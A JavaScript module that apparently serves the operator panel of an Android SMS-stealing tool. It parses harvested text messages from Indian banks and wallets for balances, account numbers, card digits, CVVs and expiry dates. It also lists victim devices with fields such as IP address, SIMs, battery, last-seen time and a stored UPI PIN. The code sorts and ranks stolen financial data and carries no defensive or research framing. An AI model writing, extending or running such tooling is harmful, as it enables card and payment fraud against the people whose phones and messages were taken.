const bankPatterns = [
  [/HDFCBK|HDFCBANK|HDFC/i, 'HDFC Bank'],
  [/SBIIN|SBIINB|SBI/i, 'SBI'],
  [/ICICIB|ICICI/i, 'ICICI Bank'],
  [/AXISBK|AXISBANK|AXIS/i, 'Axis Bank'],
  [/KOTAKB|KOTAK/i, 'Kotak Bank'],
  [/PNBSMS|PNB/i, 'PNB'],
  [/BOIIND|BOI/i, 'Bank of India'],
  [/CANBNK|CANARA/i, 'Canara Bank'],
  [/UNIONB|UBISMS/i, 'Union Bank'],
  [/YESBNK|YESBANK/i, 'Yes Bank'],
  [/IDBIBK|IDBI/i, 'IDBI Bank'],
  [/INDUSB|INDUSIND/i, 'IndusInd Bank'],
  [/FEDERAL|FEDBNK/i, 'Federal Bank'],
  [/RBLBNK|RBL/i, 'RBL Bank'],
  [/PAYTM/i, 'Paytm'],
  [/PHONEPE|PHNPE/i, 'PhonePe'],
  [/GPAY|GOOGLEPAY/i, 'Google Pay'],
  [/AMAZONPAY/i, 'Amazon Pay'],
  [/BAJAJFIN/i, 'Bajaj Finance'],
  [/CRED/i, 'CRED'],
  [/AIRTEL/i, 'Airtel Payments'],
  [/JIOMNY|JIOMONEY/i, 'Jio Money']
];

export function identifyBankName(sender) {
  for (const [regex, name] of bankPatterns) {
    if (regex.test(sender)) return name;
  }
  const match = sender.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
  return match ? match[1] : sender || 'Bank';
}

const balanceRegexes = [
  /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)[\s]*([0-9,]+\.?[0-9]*)/i,
  /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i,
  /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|₹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i,
  /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
];

const transactionRegexes = [
  /(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i,
  /^(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i,
  /(?:INR|Rs\.?|₹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i
];

const accountRegexes = [
  /(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i,
  /[xX*]{4,}([0-9]{4})/,
  /ending\s+(?:with\s+)?([0-9]{4})/i
];

const cardRegexes = [
  /(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i,
  /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i
];

const cvvRegexes = [
  /CVV[\s:]+([0-9]{3,4})/i,
  /(?:cvv|cvc|security\s+code)[\s:]+([0-9]{3,4})/i
];

const expiryRegexes = [
  /(?:expiry|exp|valid\s+thru?|valid\s+till)[\s:]+([0-9]{1,2}\/[0-9]{2,4})/i,
  /([0-9]{1,2})\/([0-9]{2,4})\s+(?:expiry|exp)/i
];

export function extractCardInfo(sms) {
  if (!sms) return null;
  const upper = sms.toUpperCase();
  if (!upper.includes('CARD') && !upper.includes('CVV') && !upper.includes('CREDIT') && !upper.includes('DEBIT')) return null;
  let cardLast4 = '', cardType = '', cvv = '', expiry = '';
  for (const regex of cardRegexes) {
    const m = sms.match(regex);
    if (m && m[1]) {
      const digits = m[1].replace(/[^0-9]/g, '');
      if (digits.length >= 4) { cardLast4 = digits.slice(-4); break }
    }
  }
  if (!cardLast4) return null;
  if (/VISA/i.test(sms)) cardType = 'VISA';
  else if (/MASTER(?:CARD)?/i.test(sms)) cardType = 'Mastercard';
  else if (/RUPAY/i.test(sms)) cardType = 'RuPay';
  else if (/AMEX|AMERICAN EXPRESS/i.test(sms)) cardType = 'Amex';
  else if (/credit/i.test(sms)) cardType = 'Credit Card';
  else if (/debit/i.test(sms)) cardType = 'Debit Card';
  for (const regex of cvvRegexes) {
    const m = sms.match(regex);
    if (m && m[1]) { cvv = m[1]; break }
  }
  for (const regex of expiryRegexes) {
    const m = sms.match(regex);
    if (m && m[1]) { expiry = m[1]; break }
  }
  return { cardLast4, cardType, cvv: cvv || undefined, expiry: expiry || undefined, rawSms: sms };
}

const phoneRegexes = [
  new RegExp(`(?:Jio|JIO)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Airtel|AIRTEL)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:BSNL|bsnl)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:MTNL|mtnl)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Docomo|DOCOMO|Tata)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Reliance|RELIANCE)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Telenor|TELENOR)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Uninor|UNINOR)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  new RegExp(`(?:Videocon|VIDEOCON)\\s+(?:Number|नंबर|Nambhar|नम्बर|No\\.?|Num)\\s*[:\\-]\\s*([6-9][0-9]{9})`),
  /(?:नंबर|नम्बर)\s*[:\-]\s*([6-9][0-9]{9})/,
  /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,
  /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /Number\s*[:\-]\s*([6-9][0-9]{9})/i,
  /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,
  /(\+91[-\s]?[6-9][0-9]{9})/,
  /(?:\b91)([6-9][0-9]{9})\b/,
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/
];

export function extractPhoneNumber(text) {
  for (const regex of phoneRegexes) {
    const m = text.match(regex);
    if (m && m[1]) {
      const digits = m[1].replace(/[^0-9]/g, '');
      if (digits.length === 10 && /^[6-9]/.test(digits)) return digits;
      if (digits.length === 12 && digits.startsWith('91') && /^91[6-9]/.test(digits)) return digits.slice(2);
    }
  }
  return null;
}

const carrierNamePatterns = [
  [/\bJio\s+Number\b/i, 'Jio'],
  [/\bAirtel\s+Number\b/i, 'Airtel'],
  [/\bBSNL\s+Number\b/i, 'BSNL'],
  [/\bVodafone\s+Number\b/i, 'Vodafone'],
  [/\bIdea\s+Number\b/i, 'Vi (Idea)'],
  [/\bVi\s+Number\b/i, 'Vi'],
  [/\bMTNL\s+Number\b/i, 'MTNL'],
  [/\bDocomo\s+Number\b/i, 'Docomo'],
  [/\bReliance\s+Number\b/i, 'Reliance'],
  [/\bTelenor\s+Number\b/i, 'Telenor'],
  [/\bUninor\s+Number\b/i, 'Uninor'],
  [/\bVideocon\s+Number\b/i, 'Videocon'],
  [/\bJio\b/i, 'Jio'],
  [/\bAirtel\b/i, 'Airtel'],
  [/\bBSNL\b/i, 'BSNL'],
  [/\bVodafone\b/i, 'Vodafone'],
  [/\b(?:Idea|Vi)\b/i, 'Vi'],
  [/\bMTNL\b/i, 'MTNL'],
  [/\bDocomo\b/i, 'Docomo'],
  [/\bReliance\s+(?:Jio|Communications)\b/i, 'Reliance'],
  [/\bTelenor\b/i, 'Telenor'],
  [/\bUninor\b/i, 'Uninor'],
  [/\bVideocon\b/i, 'Videocon']
];

const senderCarrierPatterns = [
  [/AIRTEL|JD-AIRTEL|VM-AIRTEL/i, 'Airtel'],
  [/JIOINF|JIOMSG|JIONET|JIO/i, 'Jio'],
  [/BSNLSM|BSNL/i, 'BSNL'],
  [/VISMOB|VI-|VODA|VODAFONE/i, 'Vodafone'],
  [/IDEACEL|IDEA/i, 'Vi (Idea)'],
  [/MTNL/i, 'MTNL'],
  [/TATADOC|DOCOMO/i, 'Docomo'],
  [/UNINOR/i, 'Uninor'],
  [/TELENOR/i, 'Telenor']
];

export function identifyNetwork(sender, body) {
  for (const [regex, name] of senderCarrierPatterns) {
    if (regex.test(sender)) return name;
  }
  const combined = body + ' ' + sender;
  for (const [regex, name] of carrierNamePatterns) {
    if (regex.test(combined)) return name;
  }
  return null;
}

export function parseSms(text, sender) {
  if (!text || text.trim().length < 8) return null;
  const upper = text.toUpperCase();
  const hasFinKeyword = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(upper);
  const isBankSender = /^[A-Z]{2}-[A-Z0-9]+$/.test(sender) && bankPatterns.some(([r]) => r.test(sender));
  if (!hasFinKeyword && !isBankSender) return null;
  let balance = null;
  for (const regex of balanceRegexes) {
    const m = text.match(regex);
    if (m && m[1]) {
      const val = parseFloat(m[1].replace(/,/g, ''));
      if (val >= 0) { balance = m[1].replace(/,/g, ''); break }
    }
  }
  if (!balance) return null;
  const bankName = identifyBankName(sender) || 'Bank';
  let txAmount;
  for (const regex of transactionRegexes) {
    const m = text.match(regex);
    if (m && m[1]) {
      const val = m[1].replace(/,/g, '');
      if (val !== balance) { txAmount = val; break }
    }
  }
  let txType;
  if (/credit(?:ed)?/i.test(text)) txType = 'credit';
  else if (/debit(?:ed)?|withdraw|paid|purchase|spent/i.test(text)) txType = 'debit';
  let accountLast4;
  for (const regex of accountRegexes) {
    const m = text.match(regex);
    if (m && m[1]) { accountLast4 = m[1].replace(/[^0-9]/g, '').slice(-4); break }
  }
  const phone = extractPhoneNumber(text);
  const network = identifyNetwork(text, sender);
  return {
    bankName,
    senderName: sender || 'Unknown',
    availableBalance: balance,
    transactionAmount: txAmount,
    transactionType: txType,
    accountLast4,
    phoneFromSms: phone || undefined,
    networkFromSms: network || undefined,
    rawSms: text,
    detectedAt: new Date().toISOString()
  };
}

export function parseTimestamp(value) {
  if (!value) return null;
  if (typeof value === 'number') return value < 1e12 ? value * 1000 : value;
  if (typeof value === 'string' && value.trim()) {
    const parsed = Date.parse(value);
    if (!isNaN(parsed)) return parsed;
    const m = value.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
    if (m) {
      const [, d, month, y, h, min, sec] = m;
      const date = new Date(+y, +month - 1, +d, +h, +min, +(sec || 0)).getTime();
      if (!isNaN(date)) return date;
    }
  }
  return null;
}

export function relativeTime(timestamp) {
  const diff = Date.now() - timestamp;
  if (diff < 0) return 'Just now';
  const sec = Math.floor(diff / 1000);
  const min = Math.floor(sec / 60);
  const hr = Math.floor(min / 60);
  const days = Math.floor(hr / 24);
  if (sec < 60) return `${sec}s ago`;
  if (min < 60) return `${min}m ago`;
  if (hr < 24) return `${hr}h ${min % 60}m ago`;
  if (days < 30) return `${days}d ${hr % 24}h ago`;
  return new Date(timestamp).toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric' });
}

export function formatTimestamp(timestamp) {
  return new Date(timestamp).toLocaleString('en-IN', {
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
  });
}

export function parseDevices(data) {
  const devices = [];
  if (!data || typeof data !== 'object') return devices;
  Object.entries(data).forEach(([id, dev]) => {
    if (!dev || typeof dev !== 'object') return;
    const simsArr = dev.sims;
    let sims = [];
    Array.isArray(simsArr) ? sims = simsArr : simsArr && typeof simsArr === 'object' && (sims = Object.values(simsArr));
    const battery = dev.battery ?? '—';
    const batteryStr = String(battery);
    const batPercent = parseInt(batteryStr.replace('%', '')) || 0;
    const lastSeen = dev.lastSeen ?? dev.last_seen ?? dev.lastOnline ?? dev.last_online ?? dev.lastActive ?? dev.last_active ?? dev.timestamp ?? dev.time ?? dev.dateTime ?? dev.updatedAt ?? dev.updated_at ?? null;
    const ts = parseTimestamp(lastSeen);
    devices.push({
      id,
      name: String(dev.modelName || dev.model || dev.deviceName || id),
      battery: batteryStr,
      batteryPercent: batPercent,
      status: !!dev.status,
      phoneNumber: String(dev.mobNo || (sims[0]?.phoneNumber ?? '—')),
      android: String(dev.androidV || dev.androidVersion || '—'),
      ip: String(dev.ip_address || '—'),
      storage: String(dev.storage || '—'),
      provider: String(dev.service_provider || '—'),
      sims,
      upipin: dev.upipin ? String(dev.upipin) : null,
      cpu: String(dev.cpu_arch || '—'),
      sdk: String(dev.sdkV || '—'),
      lastSeen: ts,
      lastSeenFormatted: ts ? relativeTime(ts) : undefined
    });
  });
  return devices;
}

export function extractMessages(data) {
  const msgs = [];
  if (!data || typeof data !== 'object') return msgs;
  const entries = Object.entries(data);
  const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
  for (const [, msg] of slice) {
    if (!msg || typeof msg !== 'object') continue;
    const text = String(msg.message || msg.body || msg.text || '');
    if (text.trim()) {
      msgs.push({
        text,
        sender: String(msg.sender || msg.from || 'Unknown'),
        time: String(msg.dateTime || msg.date || '')
      });
    }
  }
  return msgs.reverse();
}

export function analyzeMessages(messages) {
  const bankBalances = [], cards = [], phoneSet = new Set(), networkSet = new Set();
  for (const msg of messages) {
    const parsed = parseSms(msg.text, msg.sender);
    if (parsed) { parsed.detectedAt = msg.time || parsed.detectedAt; bankBalances.push(parsed); }
    const card = extractCardInfo(msg.text);
    if (card) cards.push(card);
    const phone = extractPhoneNumber(msg.text);
    if (phone) phoneSet.add(phone);
    const net = identifyNetwork(msg.text, msg.sender);
    if (net) networkSet.add(net);
  }
  return { bankBalances, cards, phoneNumbers: [...phoneSet], networks: [...networkSet] };
}

export function formatIndianNumber(num) {
  try {
    return parseFloat(num).toLocaleString('en-IN', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  } catch { return num; }
}
